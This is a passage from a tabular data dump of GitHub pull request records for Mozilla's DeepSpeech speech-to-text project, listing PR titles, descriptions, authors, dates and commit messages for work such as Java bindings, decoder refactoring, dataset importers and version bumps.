long sampleRate = (long) audioIn.getFormat().getSampleRate();
long numSamples = audioIn.getFrameLength();
long frameSize = audioIn.getFormat().getFrameSize();        

ByteBuffer audioBuffer = ByteBuffer.allocateDirect((int) (numSamples * 2)); // 2 bytes for each sample --> 16 bit audio
String transcription = model.doSpeechToText(audioBuffer, numSamples, sampleRate);
System.out.println(""You said: \"""" + transcription + ""\""."");
```",mikex86,41896826,2019-06-11T12:18:24Z,NONE,False,4219,1220,123,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7eebfc470628ae6daa57f58bdd7849e79f8f7db1,Fixed Markup Headings
2080,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2166,2166,Recode of the Java bindings,"A few weeks ago, I opened an Issue that DeepSpeech Java bindings (non Android only) should exist.
Here they are. The Java bindings were completely re-coded for reasons already discussed in the issue I opened.
The three Readme files contain instructions on how to use the java library and build the following binaries:
* `deepspeechandroid.aar`
*  `libdeepspeech-java.jar`
* `libdeepspeech-jni_cpu`
* `libdeepspeech-jni_cuda`
For convenience, I recommend putting them in future releases, so that they must not be built by the user, which might be a bit of a pain.
 `deepspeechandroid.aar` and `libdeepspeech-java.jar` could be available on the Maven repository. _(The old bindings are already, so they could be replaced)_

### A feeling of what it's like to use the bindings in Java
```java
DeepSpeechLibraryConfig config = new DeepSpeechLibraryConfig.Desktop.CPU(
        new File(""natives/"" + getOS() + ""/libdeepspeech_cpu."" + getOSLibExtension()).toURI().toURL(),
        new File(""natives/"" + getOSName() + ""/libdeepspeech-jni_cpu."" + getOSLibExtension()).toURI().toURL()
);
try {
     config.loadDeepSpeech();
} catch (IOException e) {
    Logger.logMsg(Logger.ERROR, ""Failed to load DeepSpeech!"");
}

DeepSpeechModel model = new DeepSpeechModel(new File(""model/output_graph.pb""), N_CEP, N_CONTEXT, new File(""model/alphabet.txt""), BEAM_WIDTH);
model.enableLMLanguageModel(new File(""model/alphabet.txt""), new File(""model/lm.binary""), new File(""model/trie""), LM_ALPHA, LM_BETA);

AudioInputStream audioIn = AudioSystem.getAudioInputStream(new File(""testInput.wav""));

long sampleRate = (long) audioIn.getFormat().getSampleRate();
long numSamples = audioIn.getFrameLength();
long frameSize = audioIn.getFormat().getFrameSize();        

ByteBuffer audioBuffer = ByteBuffer.allocateDirect((int) (numSamples * 2)); // 2 bytes for each sample --> 16 bit audio
String transcription = model.doSpeechToText(audioBuffer, numSamples, sampleRate);
System.out.println(""You said: \"""" + transcription + ""\""."");
```",mikex86,41896826,2019-06-11T12:18:24Z,NONE,False,4219,1220,123,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fdc7987b202f36ae30a5d61643b160610eabd3ae,Fixed typos and headings
2081,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2165,2165,Keep absolute per-stream time step in DecoderState (Fixes #2163),,reuben,477142,2019-06-11T10:59:01Z,MEMBER,True,7,5,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3ceb05e8b9cebcdf926e74d3b0fab44883ca2a5f,Keep absolute per-stream time step in DecoderState
2082,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2161,2161,Move decoder state to StreamingState and fix leak when creating multiple streams per model,,reuben,477142,2019-06-10T15:22:25Z,MEMBER,True,15,22,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d9c2bec35dec3df249e3c231778d2faa3ba33ee1,Move decoder state to StreamingState and fix leak when creating multiple streams per model
2083,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2160,2160,More mandarin importers,Would be interesting to see if we could get a license to the full DataTang corpus of 1505 hours: https://en.datatang.com/en/opensource,reuben,477142,2019-06-09T21:12:34Z,MEMBER,True,300,0,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ee78d471a22269de1a52d77eb073a9b686f3a4f9,Add importer for Primewords Chinese Corpus Set 1
2084,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2160,2160,More mandarin importers,Would be interesting to see if we could get a license to the full DataTang corpus of 1505 hours: https://en.datatang.com/en/opensource,reuben,477142,2019-06-09T21:12:34Z,MEMBER,True,300,0,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,67a769e0d747b967073c74820cb44909c41118be,Add importer for Free ST Chinese Mandarin Corpus
2085,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2160,2160,More mandarin importers,Would be interesting to see if we could get a license to the full DataTang corpus of 1505 hours: https://en.datatang.com/en/opensource,reuben,477142,2019-06-09T21:12:34Z,MEMBER,True,300,0,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,67b4f6826acfb1721e14ff977891f6f056afbd9a,Add importer for aidatatang_200zh corpus
2086,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2158,2158,Frame counter should be initialized on all importers,Fixes #2150,lissyx,1645737,2019-06-09T05:52:50Z,COLLABORATOR,True,2,0,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f33ead8af907e732dfe3c3d40dc2d0db9bf695da,"Frame counter should be initialized on all importers

Fixes #2150"
2087,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2156,2156,Update prod tests to point to 0.5 model,,reuben,477142,2019-06-07T15:31:39Z,MEMBER,True,12,12,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f02d79cca226914a7b05898b4aad107ed144ebba,Update prod tests to point to 0.5 model
2088,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2152,2152,Ensure frames counter is initialized,Fixes #2150,lissyx,1645737,2019-06-06T08:43:46Z,COLLABORATOR,True,1,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1313b51a5d3b3d1c1d8f4c3e96d7d14b72ef164f,"Ensure frames counter is initialized

Fixes #2150"
2089,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2149,2149,Do not fail without --bogus-records,,lissyx,1645737,2019-06-05T14:10:36Z,COLLABORATOR,True,3,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,32a73b7224c6037024cae1d41103e40af88767dd,Do not fail without --bogus-records
2090,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2148,2148,Do not import known bogus Lingua Libre records,Fixes #2147,lissyx,1645737,2019-06-04T12:37:51Z,COLLABORATOR,True,14,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3a1789646303e7e4b5fbb22788a872f5254bd747,"Do not import known bogus Lingua Libre records

Fixes #2147"
2091,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2146,2146,Refactor TF and TFLite implementations into their own classes/files,"This refactors the ModelState code which currently into a base `ModelState` class and two implementations, `TFModelState`, `TFLiteModelState`.

This greatly improves the readability of `deepspeech.cc`. I've also taken the opportunity to try and make the code style a bit more consistent. I've made all member variable names end with `_` and fixed inconsistent indentation in a few places.

This also paves the way for fixing the multi-stream bugs we currently have in the client. Not sure if we should take this for 0.5.0 though, as it's a big change.",reuben,477142,2019-06-02T01:48:05Z,MEMBER,True,1020,711,18,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6f953837fa4405d64f4db8085a698e746909f796,Refactor TF and TFLite model implementations into their own classes/files
2092,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2146,2146,Refactor TF and TFLite implementations into their own classes/files,"This refactors the ModelState code which currently into a base `ModelState` class and two implementations, `TFModelState`, `TFLiteModelState`.

This greatly improves the readability of `deepspeech.cc`. I've also taken the opportunity to try and make the code style a bit more consistent. I've made all member variable names end with `_` and fixed inconsistent indentation in a few places.

This also paves the way for fixing the multi-stream bugs we currently have in the client. Not sure if we should take this for 0.5.0 though, as it's a big change.",reuben,477142,2019-06-02T01:48:05Z,MEMBER,True,1020,711,18,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6e78bac799362516f029708c581e07de2c8fcf08,Address review comments
2093,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2146,2146,Refactor TF and TFLite implementations into their own classes/files,"This refactors the ModelState code which currently into a base `ModelState` class and two implementations, `TFModelState`, `TFLiteModelState`.

This greatly improves the readability of `deepspeech.cc`. I've also taken the opportunity to try and make the code style a bit more consistent. I've made all member variable names end with `_` and fixed inconsistent indentation in a few places.

This also paves the way for fixing the multi-stream bugs we currently have in the client. Not sure if we should take this for 0.5.0 though, as it's a big change.",reuben,477142,2019-06-02T01:48:05Z,MEMBER,True,1020,711,18,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e51b9d987d162bd4cbad0a0c94295ae7809ea086,"Remove previous state model variable, track by hand in StreamingState instead"
2094,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2146,2146,Refactor TF and TFLite implementations into their own classes/files,"This refactors the ModelState code which currently into a base `ModelState` class and two implementations, `TFModelState`, `TFLiteModelState`.

This greatly improves the readability of `deepspeech.cc`. I've also taken the opportunity to try and make the code style a bit more consistent. I've made all member variable names end with `_` and fixed inconsistent indentation in a few places.

This also paves the way for fixing the multi-stream bugs we currently have in the client. Not sure if we should take this for 0.5.0 though, as it's a big change.",reuben,477142,2019-06-02T01:48:05Z,MEMBER,True,1020,711,18,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4b305d2f5ef409f129c4638561f55b3707d9e8dd,Remove --use_seq_length flag
2095,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2146,2146,Refactor TF and TFLite implementations into their own classes/files,"This refactors the ModelState code which currently into a base `ModelState` class and two implementations, `TFModelState`, `TFLiteModelState`.

This greatly improves the readability of `deepspeech.cc`. I've also taken the opportunity to try and make the code style a bit more consistent. I've made all member variable names end with `_` and fixed inconsistent indentation in a few places.

This also paves the way for fixing the multi-stream bugs we currently have in the client. Not sure if we should take this for 0.5.0 though, as it's a big change.",reuben,477142,2019-06-02T01:48:05Z,MEMBER,True,1020,711,18,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ea1422d47b0ba5736ccda19d4bbcabc51c93b70a,Document vector/tensor copy functions
2096,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2146,2146,Refactor TF and TFLite implementations into their own classes/files,"This refactors the ModelState code which currently into a base `ModelState` class and two implementations, `TFModelState`, `TFLiteModelState`.

This greatly improves the readability of `deepspeech.cc`. I've also taken the opportunity to try and make the code style a bit more consistent. I've made all member variable names end with `_` and fixed inconsistent indentation in a few places.

This also paves the way for fixing the multi-stream bugs we currently have in the client. Not sure if we should take this for 0.5.0 though, as it's a big change.",reuben,477142,2019-06-02T01:48:05Z,MEMBER,True,1020,711,18,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f12ea5e958716ea9648833fb25cd6b204b45b4e0,Add a test for interleaved/concurrent streams with a single model instance
2097,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2145,2145,Decoder optimizations,,reuben,477142,2019-06-01T18:08:42Z,MEMBER,True,10,16,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a46288e1c8dc0f1949403af7c6f8fe95470903fa,Only create Output structure for beams that are returned in the API
2098,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2145,2145,Decoder optimizations,,reuben,477142,2019-06-01T18:08:42Z,MEMBER,True,10,16,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1c87bf781a253b5268de3629f901efcd570358d3,Avoid sorting prefix array twice
2099,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2145,2145,Decoder optimizations,,reuben,477142,2019-06-01T18:08:42Z,MEMBER,True,10,16,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,494b573c80456e26d4311a484c800e0ead1549be,Address review comments
2100,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2143,2143,Bump VERSION to 0.5.0-alpha.11,X-DeepSpeech: NOBUILD,reuben,477142,2019-05-31T01:49:57Z,MEMBER,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,47066bc9d8e5d75035fa1e8fc6b61b4b8c07eb09,"Bump VERSION to 0.5.0-alpha.11

X-DeepSpeech: NOBUILD"
2101,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2141,2141,Use separate execution plans for acoustic model and feature computation invoke calls (Fixes #2139),,reuben,477142,2019-05-30T18:52:08Z,MEMBER,True,63,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,be0da458787670c89fd529d3d3b6fad5482d4644,Use separate execution plans for acoustic model and feature computation invoke calls
2102,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2136,2136,Windows/pacmam provides SWIG 4.0.0,,lissyx,1645737,2019-05-28T10:43:00Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a9f237e654731911b9b666116d8af6dc8f27f6be,Windows/pacmam provides SWIG 4.0.0
2103,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2134,2134,Computing audio hours at import,,lissyx,1645737,2019-05-28T09:21:12Z,COLLABORATOR,True,50,3,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,17e3f284a5d2bfb018c2d574046ef52f646dcaa7,Computing audio hours at import
2104,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2132,2132,Ensure proper cleanup on macOS workers,"It seems like `-e` does is job and bash catches faulty exit code, thus
avoiding the required `mv` for dealing with caches. Doing it in a second
command should help",lissyx,1645737,2019-05-27T06:38:12Z,COLLABORATOR,True,10,10,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,81b333c2f5e9143fbca65ad707288527ca5a6198,"Ensure proper cleanup on macOS workers

It seems like `-e` does is job and bash catches faulty exit code, thus
avoiding the required `mv` for dealing with caches. Relying on 'trap' is
the proper way to always go through this code path and ensure picking
the exit code."
2105,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2131,2131,Error codes for .NET,"I've added the missing solution of the WPF example and changed the C# result code to match the native side.

I can't trigger all of the error codes, I don't have an English model to test and my Spanish native binary is a modified version that bypass alphabet code.",carlfm01,32177100,2019-05-26T05:18:48Z,COLLABORATOR,True,151,94,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,73511e48b2e47b3664656e3fe7e7af5a3022df48,Match native error codes for .NET
2106,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2130,2130,Change wrong BEAM_WIDTH .NET console client,"Related to different transcriptions between platforms.

https://discourse.mozilla.org/t/compiling-the-0-4-1-client-on-windows/38345/5",carlfm01,32177100,2019-05-26T02:15:59Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2bf4b4385f3c23493e6d03ab3165e4c40f5eb68e,Change wrong BEAM_WIDTH
2107,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2127,2127,Bump VERSION to 0.5.0-alpha.10,X-DeepSpeech: NOBUILD,lissyx,1645737,2019-05-22T18:07:35Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,66b96c48a747668e513129f025e6de29e846ba90,"Bump VERSION to 0.5.0-alpha.10

X-DeepSpeech: NOBUILD"
2108,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2126,2126,"Move init of previous_state_{c,h}",Fixes #2125,lissyx,1645737,2019-05-22T16:07:48Z,COLLABORATOR,True,6,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c95397c7ce8eeacb7bc26f9bb58c64b1f1fcfd0a,"Move init of previous_state_{c,h}

Fixes #2125"
2109,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2124,2124,Bump VERSION to 0.5.0-alpha.9,X-DeepSpeech: NOBUILD,lissyx,1645737,2019-05-22T06:44:37Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,475a18c9b2216be92bd2f2ed603ff7945d63346d,"Bump VERSION to 0.5.0-alpha.9

X-DeepSpeech: NOBUILD"
2110,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2121,2121,CTC streaming decoder,Refactored the CTC decoder to work with streaming data.,dabinat,18251622,2019-05-20T05:34:32Z,COLLABORATOR,True,220,91,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d9a269412e492ca5046c9ab89f0547be51050159,"CTC beam search streaming decoder (+6 squashed commits)
Squashed commits:
[2941b47] Fixed nits
[700572e] Restored old CTC decoder API
[5aaf75d] Fixed nits
[969d71a] Added a destructor for DecoderState
[af0be6e] Removed accumulated_logits
[9dcb7b4] CTC beam search streaming decoder"
2111,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2117,2117,common voice mandarin import problem,"Most of languages are phonogram, but mandarin are logogram.
For example, in English you can, more-or-less split on spaces to get words. However, for Chinese Mandarin each character is a word. So Mandarin transcripts should be split by spaces.",areyliu6,13973275,2019-05-17T10:22:39Z,CONTRIBUTOR,True,33,28,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,53f88f0c33d838af30f0290bb8ec985e37563d55,common voice mandarin
2112,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2117,2117,common voice mandarin import problem,"Most of languages are phonogram, but mandarin are logogram.
For example, in English you can, more-or-less split on spaces to get words. However, for Chinese Mandarin each character is a word. So Mandarin transcripts should be split by spaces.",areyliu6,13973275,2019-05-17T10:22:39Z,CONTRIBUTOR,True,33,28,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fbedbbc9f9709ef9d574ecc67a015d901cd74f22,make flag name more explicit
2113,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2117,2117,common voice mandarin import problem,"Most of languages are phonogram, but mandarin are logogram.
For example, in English you can, more-or-less split on spaces to get words. However, for Chinese Mandarin each character is a word. So Mandarin transcripts should be split by spaces.",areyliu6,13973275,2019-05-17T10:22:39Z,CONTRIBUTOR,True,33,28,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8f806f7a3a7c9c20a6d285eb1329cc4b64de6b28,fit PEP8
2114,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2111,2111,Revert to a pipelined approach for test epochs to avoid CPU OOM with large alphabets,,reuben,477142,2019-05-11T11:17:04Z,MEMBER,True,49,69,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,699e4ebcd7b988d76428057db2775a461cb8b962,Revert to a pipelined approach for test epochs to avoid CPU OOM with large alphabets
2115,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2109,2109,Bump VERSION to 0.5.0-alpha.8,X-DeepSpeech: NOBUILD,lissyx,1645737,2019-05-10T17:29:21Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6d7399add2f10279a61f46b548dc2aeae2baf723,"Bump VERSION to 0.5.0-alpha.8

X-DeepSpeech: NOBUILD"
2116,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2107,2107,Swig4 macos,X-DeepSpeech: NOBUILD,lissyx,1645737,2019-05-10T15:29:51Z,COLLABORATOR,True,116,140,105,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d47839c71af7dfe3761d7a5c4d5d27b3f275a32d,Remove upstream-merged changed and move to SWIG 4.0.0
2117,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2107,2107,Swig4 macos,X-DeepSpeech: NOBUILD,lissyx,1645737,2019-05-10T15:29:51Z,COLLABORATOR,True,116,140,105,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,af26d8b2bba3349e0ab98f1ecfaf39c25bbfbd48,Deprecate training on Python 2.7
2118,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2106,2106,Remove upstream-merged changed and move to SWIG 4.0.0,,lissyx,1645737,2019-05-10T10:42:49Z,COLLABORATOR,False,107,131,104,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d47839c71af7dfe3761d7a5c4d5d27b3f275a32d,Remove upstream-merged changed and move to SWIG 4.0.0
2119,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2106,2106,Remove upstream-merged changed and move to SWIG 4.0.0,,lissyx,1645737,2019-05-10T10:42:49Z,COLLABORATOR,False,107,131,104,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,bf68a85d615456ca77c0f3984e5e8035bb8539ea,Deprecate training on Python 2.7
2120,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2105,2105,Exported symbols should not be C++ mangled,,lissyx,1645737,2019-05-10T10:19:51Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5e7ee43174a080460f8efc24e2ce9add89c7c21a,Exported symbols should not be C++ mangled
2121,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2100,2100,Ensure TrainingSpeech is properly formatted,"Fixes #2097

X-DeepSpeech: NOBUILD",lissyx,1645737,2019-05-06T13:48:30Z,COLLABORATOR,True,80,4,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d41f98f25ca77ba12b56132c8089631540095d05,"Ensure TrainingSpeech is properly formatted

Fixes #2097"
2122,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2096,2096,Update TrainingSpeech dataset,"Fixes #2092

X-DeepSpeech: NOBUILD",lissyx,1645737,2019-05-06T08:15:46Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8402e7ac9b18b4643240d923fc05b86dadea55aa,"Update TrainingSpeech dataset

Fixes #2092

X-DeepSpeech: NOBUILD"
2123,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2095,2095,Bring back CUDA and CuDNN versions.,X-DeepSpeech: NOBUILD,lissyx,1645737,2019-05-05T13:31:56Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f81d9ddb76cf4a404a3d38d8b38f3671574ebac6,Bring back CUDA and CuDNN versions.
2124,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2090,2090,Integrated spec augment,Based on spec,cahuja1992,5588828,2019-05-02T12:07:43Z,CONTRIBUTOR,False,241,6,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b007a54289024d71c10f87bd903bd8f1307cc96d,Integrated spec augment
2125,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2090,2090,Integrated spec augment,Based on spec,cahuja1992,5588828,2019-05-02T12:07:43Z,CONTRIBUTOR,False,241,6,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0ddba0fe3023f44255f50c3ba14e6648d360b7b6,Added a spec_augment under utils. Calculation of log_mel_spectogram eagerly and then giving to the augmentation object that returns a tensor
2126,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2088,2088,Force only one GPU on LDC93S1 scripts,Fixes #2087,lissyx,1645737,2019-04-30T15:37:09Z,COLLABORATOR,True,20,0,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,333a175dfdf38298fabb8e46e2c1d75a3f05e563,"Force only one GPU on LDC93S1 scripts

Fixes #2087"
2127,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2086,2086,Add AISHELL dataset importer,,reuben,477142,2019-04-29T13:02:12Z,MEMBER,True,95,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,feacdea4aa4ea1d81f085864efa26aabdd26743e,Add AISHELL dataset importer
2128,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2079,2079,Updated Dockerfile,"* use python 3
* include git-lfs
* allow checkout from GitHub instead of local copy step",cfreemoser,16628599,2019-04-28T09:37:54Z,CONTRIBUTOR,True,21,16,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f5bb103f88219fbba3de7dcbe2960e90c4c6ddcf,"Updated Dockerfile

* use python 3
* include git-lfs
* allow checkout from GitHub instead of local copy step"
2129,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2079,2079,Updated Dockerfile,"* use python 3
* include git-lfs
* allow checkout from GitHub instead of local copy step",cfreemoser,16628599,2019-04-28T09:37:54Z,CONTRIBUTOR,True,21,16,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2050aa4cf65807d3f1537d27e77e199d10bce78e,make git lfs optinal
2130,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2079,2079,Updated Dockerfile,"* use python 3
* include git-lfs
* allow checkout from GitHub instead of local copy step",cfreemoser,16628599,2019-04-28T09:37:54Z,CONTRIBUTOR,True,21,16,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7cfd7b85ddec4b6d67dd4751f5a9fe3dcf8f252d,Removed software-properties-common and curl
2131,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2076,2076,Bump VERSION to 0.5.0-alpha.7,X-DeepSpeech: NOBUILD,lissyx,1645737,2019-04-26T06:23:23Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5a77f09770f28a8a6310123e43b412925af74bd1,"Bump VERSION to 0.5.0-alpha.7

X-DeepSpeech: NOBUILD"
2132,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2074,2074,Some bindings clean-up,"v8 does not guarantee wrapper destructors will get called, so we need to expose and use the DS_DestroyModel/DS_FreeMetadata functions. DS_FreeString can be handled by the SWIG layer because the contents are copied into the v8 object.

On the Python bindings I made the Metadata.items array look like a list on the Python side and cleaned up linter errors in setup.py.",reuben,477142,2019-04-25T11:51:58Z,MEMBER,True,119,118,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f39700643694de36550dd4f1eea3d08874d6597b,Make Metadata.items more idiomatic in Python bindings
2133,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2074,2074,Some bindings clean-up,"v8 does not guarantee wrapper destructors will get called, so we need to expose and use the DS_DestroyModel/DS_FreeMetadata functions. DS_FreeString can be handled by the SWIG layer because the contents are copied into the v8 object.

